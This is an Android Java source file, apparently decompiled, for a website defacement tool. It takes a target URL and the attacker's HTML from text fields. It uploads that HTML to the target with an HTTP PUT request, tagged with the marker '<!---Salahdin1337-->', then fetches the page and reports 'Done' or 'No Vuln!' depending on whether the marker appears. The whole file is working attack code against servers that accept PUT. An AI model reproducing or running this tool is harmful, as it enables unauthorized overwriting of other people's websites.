import android.app.Activity;
import android.os.Bundle;
import android.os.StrictMode;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
  public String deface;
  public EditText link;
  public EditText mypage;
  public TextView source;

  /* access modifiers changed from: protected */
  public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView(R.layout.activity_main);
    StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());
    this.mypage = (EditText) findViewById(R.id.deface);
    this.deface = this.mypage.getText().toString();
    this.link = (EditText) findViewById(R.id.url);
  }

  public void print(String str) {
    Toast makeText = Toast.makeText(this, str, 1);
    makeText.setGravity(17, 0, 0);
    makeText.show();
  }

  public void get(String str) {
    BufferedReader bufferedReader;
    try {
      HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
      httpURLConnection.setRequestMethod("GET");
      httpURLConnection.setDoOutput(true);
      httpURLConnection.setDoOutput(false);
      httpURLConnection.setRequestProperty(
          "User-Agent",
          "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36");
      httpURLConnection.setInstanceFollowRedirects(false);
      httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
      httpURLConnection.setRequestProperty("charset", "utf-8");
      httpURLConnection.setUseCaches(false);
      if (100 > httpURLConnection.getResponseCode() || httpURLConnection.getResponseCode() > 399) {
        bufferedReader =
            new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
      } else {
        bufferedReader =
            new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
      }
      StringBuffer stringBuffer = new StringBuffer();
      while (true) {
        String readLine = bufferedReader.readLine();
        if (readLine == null) {
          break;
        }
        stringBuffer.append(readLine);
      }
      if (stringBuffer.toString().contains("<!---Salahdin1337-->")) {
        print(String.valueOf(str) + " --> Done");
      } else {
        print(String.valueOf(str) + " --> No Vuln!");
      }
      bufferedReader.close();
    } catch (Exception e) {
      print(e.toString());
    }
  }

  public void put(String str) {
    try {
      HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
      httpURLConnection.setDoOutput(true);
      httpURLConnection.setRequestProperty(
          "User-Agent",
          "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36");
      httpURLConnection.setRequestProperty("Content-Type", "text/html");
      httpURLConnection.setRequestMethod("PUT");
      OutputStreamWriter outputStreamWriter =
          new OutputStreamWriter(httpURLConnection.getOutputStream());
      outputStreamWriter.write(mypage.getText().toString()+"<!---Salahdin1337-->");
      outputStreamWriter.close();
      httpURLConnection.getInputStream();
    } catch (Exception e) {
      print(e.toString());
    }
  }

}
